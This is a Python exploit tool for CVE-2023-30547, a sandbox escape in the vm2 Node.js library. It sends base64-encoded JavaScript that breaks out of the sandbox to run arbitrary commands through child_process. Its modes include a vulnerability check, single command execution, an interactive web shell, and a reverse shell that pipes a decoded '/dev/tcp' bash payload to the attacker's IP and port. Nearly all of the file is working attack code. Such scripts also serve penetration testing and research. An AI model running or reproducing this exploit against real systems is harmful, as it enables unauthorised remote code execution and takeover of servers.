#!/usr/bin/python3
"""
Author: @cur1iosity
Date: 2024-14-02
"""
import functools

import requests
import argparse
import base64
from enum import StrEnum, auto


class mode(StrEnum):
    """Enum for the different modes the tool can run in."""
    CHECK = auto()
    COMMAND_EXECUTION = auto()
    WEB_SHELL = auto()
    REVERSE_SHELL = auto()


class payload(StrEnum):
    """Enum for the different payloads the tool can use."""
    CHECK = 'const version = require("vm2/package.json").version;if (version < "3.9.17") {true} else {false;}'
    COMMAND_EXECUTION = """const {VM} = require("vm2");const vm = new VM();const code = `
    err = {};
    const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();}};
    const proxiedErr = new Proxy(err, handler);
    try {
    throw proxiedErr;
    } catch ({constructor: c}) {c.constructor('return process')().mainModule.require('child_process').execSync('~c~');}`;
    console.log(vm.run(code));
    """
    REVERSE_SHELL = 'echo "b64payload" | base64 -d | bash'


def add_protocol_if_missing(func):
    """Decorator to add the protocol to the target if it is missing."""
    @functools.wraps(func)
    def wrapper(**kwargs):
        kwargs["url"] = f"https://{target}" if not (target := kwargs["url"]).startswith("http") else target
        print(f"[*] Trying connect to the target: {target}")
        try:
            return func(**kwargs)
        except requests.exceptions.ConnectionError:
            print(f"[-] Target: {target} is not reachable. Trying to connect to the target with http.")
            print(f"[*] Switched proto: {target}")
            kwargs['target'] = target.replace("https", "http")
            return func(**kwargs)
    return wrapper


def add_endpoint_if_missing(func):
    """Decorator to add the endpoint to the target if it is missing."""
    @functools.wraps(func)
    def wrapper(**kwargs):
        result: requests.Response = func(**kwargs)
        if result.status_code not in [200, 201]:
            kwargs['target'] = f"{kwargs['target'].strip('/')}/run"
            func(**kwargs)
            if result.status_code not in [200, 201]:
                print(f"[-] Request to {kwargs['target']}-endpoint failed. Check if the endpoint is correct. Exiting.")
    return wrapper


def parse_arguments() -> argparse.Namespace:
    """Parse the arguments provided to the tool."""
    parser = argparse.ArgumentParser(description="Tool for exploring CVE-2023-30547. Usage examples:\n" +
                                                 "python CVE-2023-30547.py -m check -t http://url.com/run" +
                                                 "python CVE-2023-30547.py -m command_execution -t domain.com -c 'whoami'" +
                                                 "python CVE-2023-30547.py -m reverse_shell -t domain.com/run -p 1234 -i 10.10.10.10",
                                     )
    parser.add_argument("-m", "--mode",
                        choices=[x for x in mode],
                        help="Mode to run the tool in.", required=True),
    parser.add_argument("-t", "--target", help="Target to run the tool against.", required=True)
    parser.add_argument("-c", "--command", help="Command to execute in exploit mode.", required=False)
    parser.add_argument("-p", "--port", help="Local port to use for reverse shell.", required=False)
    parser.add_argument("-i", "--ip", help="Local ip to use for reverse shell.", required=False)
    return parser.parse_args()


def valid_arguments(args: argparse.Namespace) -> bool:
    """Check if the arguments provided are valid."""
    if not args.target:
        print("No target provided. Exiting.")
        return False
    if args.mode == mode.COMMAND_EXECUTION and not args.command:
        print("No command provided. Exiting.")
        return False
    if args.mode == mode.REVERSE_SHELL and not args.port and not args.ip:
        print("No port or ip provided. Exiting.")
        return False
    return True


def b64_encode(str_to_encode: str) -> str:
    """Base64 encode the payload."""
    return base64.b64encode(str_to_encode.encode('utf-8')).decode('utf-8')


def _send(url: str, payload: str) -> requests.Response:
    """Send the payload to the target."""
    return requests.Session().post(url=url, json={"code": b64_encode(payload)})


def is_vulnerable(target: str) -> bool:
    """Check if the target is vulnerable to the CVE."""
    response = _send(target, payload.CHECK)
    if not response.status_code == 200:
        print(f"[-] Wrong endpoint. Request failed. Exiting.")
        exit(1)
    return bool('true' in response.text)


def check_target(target: str) -> str:
    """Check if the target is vulnerable to the CVE."""
    s = requests.Session()
    try:
        s.get(target)
    except requests.exceptions.MissingSchema:
        target = f"https://{target}"

    try:
        s.get(target, verify=False)
    except requests.exceptions.ConnectionError:
        target = target.replace("https", "http")

    try:
        s.get(target)
    except requests.exceptions.ConnectionError:
        print(f"[-] Target: {target} is not reachable. Exiting.")
        exit(1)

    print(f"[*] Url: {target}")
    return target


def check_vulnerable(target: str) -> None:
    """Check if the target is vulnerable to the CVE."""
    message: str = "[+] Target is vulnerable to the CVE-2023-CVE-2023-30547."
    print(message) if is_vulnerable(target) \
        else print(message.replace('is', 'is not') + " Exiting.")
    return


def main() -> None:
    """Main function to run the tool."""
    args: argparse.Namespace = parse_arguments()

    if not valid_arguments(args):
        return

    target = check_target(args.target)

    if args.mode == mode.CHECK:
        check_vulnerable(target)

    if args.mode == mode.COMMAND_EXECUTION:
        response = _send(target, payload.COMMAND_EXECUTION.replace('~c~', args.command))
        print(f"[*] Command: \"{args.command}\" was sent to the target.")
        print(f"[+] Response:")
        print(response.json().get('output'))

    try:
        if args.mode == mode.REVERSE_SHELL:
            plain_shell = f"bash -i >& /dev/tcp/{args.ip}/{args.port} 0>&1"
            command = payload.REVERSE_SHELL.replace('b64payload', b64_encode(plain_shell))
            _send(target, payload.COMMAND_EXECUTION.replace('~c~', command))
            print(f"[+] Reverse shell payload was sent to the target.")

        if args.mode == mode.WEB_SHELL:
                while inp := input(">"):
                    if inp.lower() in ['exit', 'quit']:
                        break
                    response = _send(target, payload.COMMAND_EXECUTION.replace('~c~', inp))
                    print(response.json().get('output'))
    except KeyboardInterrupt:
        print("[-] Exiting.")
        exit(1)


if __name__ == "__main__":
    main()
